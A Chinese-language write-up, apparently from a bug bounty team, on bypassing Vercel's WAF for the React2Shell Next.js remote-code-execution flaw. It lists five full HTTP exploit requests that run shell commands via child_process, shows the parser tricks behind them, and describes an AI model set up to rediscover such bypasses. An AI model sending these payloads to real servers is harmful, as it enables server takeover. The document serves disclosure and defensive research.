#  React2Shell WAF 绕过实录：Vercel 花 100 万美元请黑客找漏洞  
 幻泉之洲   2026-05-11 05:57  
  
>   
  
## React2Shell：一个请求就能拿下服务器  
  
React2Shell（https://react2shell.com，CVE-2025-55182）是 React Server Functions 的一个预认证远程代码执行漏洞，影响 Next.js 15.x 到 16.0.6。可以把它想象成“React 框架界的 Heartbleed”——所有使用 React 框架和打包器的服务器都暴露了，包括 Next.js、react-router、Waku、@parcel/rsc、@vitejs/plugin-rsc 和 rwsdk。  
  
这里不深入分析漏洞原理。想了解技术细节，可以看 Vercel CEO Guillermo Rauch（@rauchg）发的深度分析（https://x.com/rauchg/status/1997362942929440937），或者原作者 Lachlan Davidson 的 PoC（https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc）。  
  
这种漏洞爆出来的时候，“赶紧打补丁”说起来容易做起来难。升级到最新版可能搞崩生产环境、影响用户，甚至你都没意识到某个服务器在用受影响包。开发团队忙着打补丁的时候，WAF 提供商可以大规模缓解风险——拦截触发漏洞的恶意 HTTP 请求。  
## WAF 的硬伤：语法不等价  
  
WAF 有用，但从来都不是铜墙铁壁。只要使劲戳，总能找到绕过方法。根本问题在于语法不等价：WAF 用一种方式解析 HTTP 请求，而后端（Node.js、Next.js、Apache 或其他）用另一种方式解析。一旦出现差异，对 WAF 来说无害的 payload，后端解释后就变成了恶意代码。  
  
HTTP 的语法又乱又依赖上下文，要完美建模每个后端的解析方式几乎不可能。这就是为什么那种“什么都能拦”的通用 WAF 几乎总会漏东西——它们没有后端解析请求的精确上下文。在 WAF、反向代理、框架和应用服务器之间的缝隙里，payload 溜过去。  
  
找到这些绕过方法不容易，但一个执着的攻击者总能得逞。Vercel 做了件不寻常的事来验证这一点：他们悬赏 5 万美元征集每个独特的 WAF 绕过方法。实际上变成了一个众包 WAF 绕过挑战，研究者们突然就有动力在真正攻击者之前找到解析差异。根据 Vercel 的总结（https://vercel.com/blog/our-million-dollar-hacker-challenge-for-react2-shell），116 名研究者参与，20 种独特绕过技术被验证，Vercel 支付了超过 100 万美元的奖金，我们团队赚了 17 万。得给 Vercel 点赞——他们很聪明，搞了这个挑战，把整个研究社区变成了合作伙伴，在几天内强化了 WAF，而不是几个月。  
  
对 Vercel 来说，构建一个和后端解析匹配的 WAF 比其他提供商更可行，因为他们控制着相对统一的基于 Node.js 的 HTTP 栈。这让他们在修复当前混乱上迈出了一大步，同时也暴露了未来攻击会继续利用的那类间隙。  
  
下面聊聊我们是怎么找到这些绕过方法的。  
## 搞懂 WAF 的检测逻辑  
>   
  
  
首先我们想弄清楚 WAF 是怎么识别攻击的。戳了几下之后，它好像在拦截 :constructor。接下来问题是：它到底在哪里检测这个模式？  
  
一个基本的多部分请求长这样：  
  
POST / HTTP/1.1Host: localhostContent-Type: multipart/form-data; boundary=yContent-Length: [...auto]--yContent-Disposition: form-data; name="foo"bar--y--  
  
我们有个常规流程来理解 WAF 和后端行为。下面是一些当时想到的比较直接的检查项：  
- **Content-Type 头解析**：怎么判断是 form-data 还是 urlencoded？能让 WAF 和后端意见不一致吗？怎么解析 boundary=？（空格、引号、转义、RFC 5987、大小写敏感、重复参数等）支持字符集吗？（utf16、cp875 等）多个 Content-Type 头？  
- **多部分正文解析**：只支持 \r\n 换行，还是 \n 也行？超大体怎么处理？重复字段名？边界标记之外的数据？  
- **Form-Data 字段解析**：Content-Disposition 头解析（类似混淆 boundary=，检查 name 和 filename，RFC 5987 支持等）。每个字段的 Content-Type 和字符集？同一个部分内的重复头？支持 Content-Transfer-Encoding 吗？  
- **请求走私技巧**：Transfer-Encoding 花招。HTTP/2 降级问题。  
目标是找到 WAF 和后端之间的差异。有些可能直接就能利用，有些可能需要组合多个技巧。为了精确理解 WAF 的行为以及什么请求被传递到了后端，我们快速在 Vercel 上部署了一个 hello-world Next.js，带一个调试端点，回显后端解析后的结果。  
  
戳完 WAF 之后，我们初步猜出了它的检测流程。  
### 观察到的流程  
1. 解析表单正文  
1. 忽略边界外的垃圾数据  
1. 对表单值做 JSON 反转义  
1. 如果任何值中出现 :constructor，就拦截  
太好了！WAF 忽略边界外的数据。  
  
POST / HTTP/1.1Host: localhostContent-Type: multipart/form-data; boundary=yContent-Length: [...auto]garbage--yContent-Disposition: form-data; name="foo"bar--y--garbage  
  
而且它只在解析后的表单值中检测关键词。所以如果我们能让 WAF 和后端在边界上意见不一致，就能绕过。  
  
这几乎立刻给了我们绕过方法 1，甚至还没完全尝试。  
## 绕过方法 1：重复的边界参数  
  
POST / HTTP/1.1Host: nextjs-cve-hackerone.vercel.appNext-Action: xContent-Type: multipart/form-data; boundary=y; boundary=xContent-Length: [...auto]--yContent-Disposition: form-data; name="0"{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $VERCEL_PLATFORM_PROTECTION').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_formData":{"get":"$1:constructor:constructor"}}}--yContent-Disposition: form-data; name="1""$@0"--y--  
  
Payload 主要来自 @maple3142。我们在 Content-Type 头里加了一个 boundary=x，并把 JS 代码改成让命令输出显示在响应头里。WAF 以为边界是 x，忽略了整个正文。后端以为边界是 y，正常解析。  
  
第一次成功后我们很兴奋，想找到更多绕过。  
## 更新我们的观察  
  
又戳了一阵之后，我们对 WAF 的认知稍微更新了一点。  
### 观察到的流程  
1. 解析表单正文  
1. 如果解析失败，放行请求  
1. 忽略边界外的垃圾数据  
1. 如果 Content-Disposition 中有 filename，就允许任何内容  
1. 对表单值做 JSON 反转义  
1. 如果任何值中出现 :constructor，就拦截  
我们特别想利用那个 filename 行为，因为如果存在 filename，内容不会被检查。后端也支持 RFC 5987 风格的 filename*=utf8''%61，但没成功。不过，在测试边界中的非 UTF-8 字节时，绕过了方法 2 意外出现了。  
## 绕过方法 2：头中的非 UTF-8 字节  
  
POST / HTTP/1.1Host: nextjs-cve-hackerone.vercel.appNext-Action: xContent-Type: multipart/form-data; boundary="y"; a="b<0x88>"Content-Length: [...auto]--yContent-Disposition: form-data; name="0"{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $VERCEL_PLATFORM_PROTECTION').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_formData":{"get":"$1:constructor:constructor"}}}--yContent-Disposition: form-data; name="1""$@0"--y--  
  
最开始我们用了 y<0x88> 作为边界，发现它直接绕过了 WAF。简化之后，我们意识到 WAF 在任何头中遇到非 UTF-8 字节时就会失败。一旦失败，它就转发请求，不做任何清理。两个绕过了，该坐下来看看有没有漏掉什么。  
## 绕过方法 3：UTF-16LE 字符集  
  
实际上有件奇怪的事。当我们在多部分中的 Content-Type 头里指定 charset=utf16 时，后端返回的值是 undefined。这让我们好奇，于是深入看了后端解析器。  
  
结果 busboy 支持几种字符集（https://github.com/mscdex/busboy/blob/6b3dcf69d38c1a8d53a0b3e4c88ba296f6c91525/lib/utils.js#L403-L406），包括 utf16le 和 ucs2，它们被当作 UTF-16 处理。甚至还有一个有 bug 的 base64 模式，编码而不是解码。这给了我们绕过方法 3。  
  
POST / HTTP/1.1Host: nextjs-cve-hackerone.vercel.appNext-Action: xContent-Type: multipart/form-data; boundary="y"Content-Length: [...auto]--yContent-Disposition: form-data; name="0"Content-Type: text/plain; charset=utf16le{<0x00>"<0x00>t<0x00>h<0x00>e<0x00>n<0x00>"<0x00>[...UTF-16LE encoded payload]--yContent-Disposition: form-data; name="1""$@0"--y--  
  
在多部分字段中添加 Content-Type: text/plain; charset=utf16le，busboy 会用 ucs2Slice 解码值。这让我们可以用 UTF-16LE 编码隐藏 :constructor。WAF 扫描原始字节，没发现任何可疑。  
## WAF 升级了  
  
这三个绕过之后，我们打了个盹，等 Vercel 打补丁。半天后醒来，重新检查了 WAF 行为。  
### 观察到的流程  
1. 检查 Content-Type 中是否存在多次 boundary=  
1. 检查是否存在多个 Content-Type 头  
1. 解析表单正文  
1. 如果解析失败，拦截请求  
1. 忽略边界外的垃圾数据  
1. 如果 Content-Disposition 中有 filename，允许任何内容  
1. 如果 Content-Type 中的 charset 不是 utf8，拦截请求  
1. 对表单值做两次 JSON 反转义  
1. 如果任何值中出现 "_response": 或 :constructor，拦截  
嗯……“如果 charset 不是 utf8，拦截请求”？这看起来很难做对。快速检查确认了我们的怀疑。  
## 绕过方法 4：多部分字段中的重复 Content-Type  
  
POST / HTTP/1.1Host: nextjs-cve-hackerone.vercel.appNext-Action: xContent-Type: multipart/form-data; boundary="y"Content-Length: [...auto]--yContent-Disposition: form-data; name="0"Content-Type: text/plain; charset=utf16leContent-Type: text/plain; charset=utf8{<0x00>"<0x00>t<0x00>h<0x00>e<0x00>n<0x00>"<0x00>[...UTF-16LE encoded payload]--yContent-Disposition: form-data; name="1""$@0"--y--  
  
在多部分字段中添加多个 Content-Type 头，我们只是让 WAF 和后端意见不一致。WAF 看到了 charset=utf8，放行。Busboy 用了第一个（charset=utf16le），解码了我们的 payload。  
  
此时我们相当确信这件事不可能完全做对。HTTP 的每个部分都有太多解析差异了。但在结束游戏之前，我们还有一个优势没充分利用：“WAF 忽略边界外的垃圾数据。”如果我们能让 WAF 和后端在边界本身上有分歧，仍然可以绕过。  
## 绕过方法 5：边界结束标记中的尾随空格  
  
简单的路径（重复 boundary=）已经被修补了。所以我们专注于单个边界的解析怪癖。引号内的转义是一样的。非 UTF-8 被拦截了。WAF 接受 boundary= y 而 busboy 认为它格式错误，但这没给我们什么收获。直到我们发现 WAF 接受边界结束标记中的尾随空格，而后端不接受。  
  
POST / HTTP/1.1Host: nextjs-cve-hackerone.vercel.appContent-Type: multipart/form-data; boundary="y"Next-Action: xContent-Length: [...auto]--y-- --yContent-Disposition: form-data; name="foo"11--yContent-Disposition: form-data; name="0"{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $VERCEL_PLATFORM_PROTECTION').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_formData":{"get":"$1:constructor:constructor"}}}--yContent-Disposition: form-data; name="1""$@0"--y--  
  
在正文开头加上 --y-- （带一个尾随空格），WAF 以为表单已经结束。后端把它当垃圾，还没开始解析。下面的所有内容都被 WAF 当垃圾忽略掉了。  
## 最后一次升级  
  
在第五次绕过之后，我们注意到 Vercel 显著改变了策略。我们开始寻找一个 gadget，允许我们用编码把 :constructor 走私进 _response: 里面。但还没找到，另一个团队就抢先了，Vercel 推出了补丁。  
  
因为很多研究者同时在戳 WAF，他们很可能意识到解析差异永远搞不完。这是我们观察到的最终流程。  
### 观察到的流程  
1. 检查 Content-Type 中是否存在多次 boundary=  
1. 检查是否存在多个 Content-Type 头  
1. 从原始正文中移除所有 <0x00> 字节  
1. 对原始正文做两次 JSON 反转义  
1. 如果在原始正文中出现 "_response"\s*: 或 :constructor，拦截  
这完全消除了 WAF 和后端之间的 HTTP 解析差异，尽管在性能和可能的误报方面有自己的权衡。  
## 用 Gemini 2.5 Pro 测试  
  
挑战结束后，我们测试了 Gemini 是否能找到同样的绕过方法，甚至可能找到新的。黑盒设置效果不好。当我们只提供 URL 编码的 payload 并要求模型找绕过方法时，它们大多数只是在消耗 token。它们需要一种方法来探测 WAF、观察反馈并有迭代地调整 payload。  
  
在白盒环境中，模型表现好得多。我们给了它们我们从绕过方法中推导出的实际 WAF 源码、Coraza（https://github.com/corazawaf/coraza），并用 Vercel WAF 环境（https://github.com/HacktronAI/skills/tree/main/environments/vercel-waf-env/waf）设置了一个本地环境。工具给模型提供了读取源码和通过 WAF 发送探测的简单功能。  
  
┌──────────────┐     ┌──────────────┐     ┌──────────────┐│   Executor   │────▶│   Coraza     │────▶│   Backend    ││   :8009      │     │   WAF :9091  │     │   :3009      ││              │     │              │     │              ││ Sandboxed    │     │ Blocks       │     │ Next.js 16   ││ Python       │     │ :constructor │     │ CVE-2025-    ││ execution    │     │ __proto__    │     │ 55182        │└──────────────┘     └──────────────┘     └──────────────┘  
  
有了这个设置，模型找到了我们手动找到的全部绕过方法。如果提示词对路，它还能找到更多，但我们把这些留给读者去探索吧。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibdYMM1uQgmYX02zKZIj1tliaFIwFdF2w5dWwekAfv5nSAxKpAGadrFCv7sCicaLibSl82lGtgwMeJJwTQcTria65FHg8LjSdJsNicwc/640?wx_fmt=png&from=appmsg "")  
  
这个实验告诉我们：当模型有了合适的上下文、正确的反馈和能工作的环境，就能发挥出最大能力。你可以自己试试 Vercel WAF 环境（https://github.com/HacktronAI/skills/tree/main/environments/vercel-waf-env/waf），看看结果。  
## 结论  
  
WAF 不是铜墙铁壁，用足够大的压力就能打破。修补底层漏洞永远应该是第一优先级。  
  
针对 React2Shell 的情况，Vercel 的应对是正确的。他们清楚地知道 WAF 会在哪里露怯，而不是假装它坚不可摧，他们用奖金激励大家找绕过方法。这是我见过的对零日漏洞最快、最有创意的响应之一——你实际上招募了整个研究社区来压力测试。这似乎效果很好，根据 Vercel 自己的总结，WAF 在披露后的几周内拦截了超过 600 万次利用尝试。  
### 参考资料  
  
[1]   
https://www.hacktron.ai/blog/react2shell-vercel-waf-bypass  
  
